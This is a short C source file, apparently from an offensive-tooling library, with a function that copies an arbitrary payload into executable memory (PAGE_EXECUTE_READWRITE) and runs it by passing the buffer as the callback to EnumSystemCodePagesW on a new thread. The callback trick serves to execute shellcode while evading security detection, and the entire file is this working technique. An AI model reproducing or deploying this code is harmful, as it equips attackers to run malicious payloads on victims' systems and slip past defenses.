#include "Win32Helper.h"

VOID InvokeEnumSystemCodePagesWThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)lpParameter, CP_INSTALLED);
}

BOOL MpfSceViaEnumSystemCodePagesW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumSystemCodePagesWThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}